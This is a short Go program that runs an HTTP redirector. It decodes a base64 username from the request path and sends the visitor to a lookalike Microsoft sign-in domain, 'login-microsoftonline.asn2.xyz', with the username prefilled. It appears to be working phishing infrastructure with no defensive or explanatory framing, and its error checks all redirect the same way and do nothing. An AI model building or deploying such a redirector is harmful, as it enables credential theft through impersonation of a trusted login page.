package main

import (
	"net/http"
	"net/url"

	"encoding/base64"

	"github.com/go-chi/chi/v5"
	"github.com/go-chi/chi/v5/middleware"
)

func main() {
	r := chi.NewRouter()
	r.Use(middleware.Logger)

	var (
		// redirectErrorLink = "https://google.com" //ERROR LINK
		prefixLandingPage = "https://login-microsoftonline.asn2.xyz/?username="
	)

	r.Get("/ref_{base64}", func(w http.ResponseWriter, r *http.Request) {

		data, err := base64.StdEncoding.DecodeString(chi.URLParam(r, "base64"))
		targetLink := prefixLandingPage + string(data)
		//fmt.Printf("%q\n", err, string(data))

		if err != nil {
			http.Redirect(w, r, targetLink, http.StatusMovedPermanently)
		}

		if !IsUrl(targetLink) {
			http.Redirect(w, r, targetLink, http.StatusMovedPermanently)
		}

		http.Redirect(w, r, targetLink, http.StatusMovedPermanently)
	})

	http.ListenAndServe(":80", r)
}
 

func IsUrl(str string) bool {
	u, err := url.Parse(str)
	return err == nil && u.Scheme != "" && u.Host != ""
}
